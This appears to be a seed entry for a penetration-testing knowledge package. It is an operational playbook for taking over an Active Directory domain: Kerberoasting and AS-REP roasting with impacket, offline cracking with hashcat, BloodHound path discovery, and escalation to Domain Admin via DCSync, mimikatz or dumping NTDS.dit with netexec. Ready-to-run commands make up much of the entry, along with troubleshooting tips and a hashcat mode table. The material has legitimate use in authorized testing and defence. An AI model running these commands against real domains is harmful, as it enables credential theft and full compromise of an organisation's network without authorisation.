# [Seed] Kerberoasting → Offline Cracking → DA

## Scenario Classification
Penetration testing / AD attack

## Target Overview
Holding one regular domain-user credential; the target domain has service accounts with SPNs configured. Use Kerberoasting to obtain TGS hashes, crack them offline, and once a plaintext password is recovered, check BloodHound for a path straight to DA.

## Full Execution Chain

1. Establish a domain foothold (any regular user, no local admin needed)
2. Enumerate SPNs
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. See which accounts have SPNs configured (usually SQL Server / IIS / custom service accounts)
4. Crack offline
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. Crack a svc account's password → query BloodHound for that account's reachable paths
6. If the account is in a Tier 0 group (Domain Admins / Server Operators / Backup Operators) → straight to DCSync
7. If not, but RDP/WinRM onto some key machine is possible → dump with mimikatz inside and chain the way to DA

## Pitfall Log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| GetUserSPNs returns nothing | Current user lacks permission to read SPNs | Any regular domain user can; likely a wrong -dc-ip or PreAuth not passing | 20min |
| Cracking runs for hours without result | Password is strong | 1) Change wordlist (rockyou.txt + corp keywords)  2) Get a GPU (hashcat -d 1)  3) Try the OneRuleToRuleThemAll ruleset | hours |
| Password obtained but login fails | Credentials expired or case-sensitive | Validate first with nxc: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound has no data | GPO/ACL missing from collection | `bloodhound-python -c All` must carry All; newer BHCE recommends `--zip` | 30min |
| AS-REP Roasting found no targets | Few accounts with "Do not require Kerberos preauth" set | Run `GetNPUsers.py` separately: ` -usersfile users.txt -no-pass` | 15min |

## Toolchain Findings

- **impacket-GetUserSPNs** is the de facto standard, more cross-platform than PowerView
- **netexec (nxc)** is the CrackMapExec successor, faster, with built-in spider_plus / lsassy / ntds and other modules
- **BloodHound Community Edition (BHCE)** is the new version, much faster than old BloodHound
- **OneRuleToRuleThemAll** ruleset works best for password cracking
- **bloodyAD** is a new-generation AD tool specializing in "low-privilege ACL abuse for escalation"

## Key Code/Commands

Full Kerberoasting flow:

```bash
# 1. Validate credentials
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. Extract TGS hashes
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. Swing at AS-REP along the way
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. Crack offline
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. After a password is recovered, collect BloodHound
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. Find paths: mark the svc account as Owned, look at Shortest Path to DA
```

If the svc account holds SeBackupPrivilege on the DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# Directly dump NTDS.dit
```

## Improvement Suggestions for This Package

- `pentest-tools/references/network-attack-defense.md` should have a full Kerberoasting section
- BloodHound CE is now mainstream; bootstrap-manifest should explicitly install `bloodhound-ce-cli`
- Add `pentest-tools/references/ad-cheatsheet.md` covering the major AD attacks (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15) on one page

## Reusable Patterns/Script Snippets

**Standard 30 minutes after a domain foothold**:

```text
1. nxc smb to validate credentials + auto spider shares
2. GetUserSPNs + GetNPUsers in one go
3. Collect with bloodhound-python -c All
4. Crack offline in parallel (GPU running)
5. While waiting, browse BloodHound for Tier 0 / Pre-built attack paths
6. Password cracked → mark Owned → re-query paths
```

**AD Kerberos hashcat mode quick reference**:

| Mode | Purpose |
|------|------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600  | NetNTLMv2 (captured by Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## Evolution Actions
- [ ] Add ad-cheatsheet.md
- [ ] Check nxc / bloodhound-ce / bloodyAD status in tool-index
- [x] Routing matrix already includes Kerberos / Kerberoasting

## Environment Info
- Kali 2026.x, impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, domain functional level 2016+
- Attack position: any domain foothold (regular domain user)

## Sanitization Requirements
This entry is seed data written from public AD attack technique patterns; no real target domain involved.
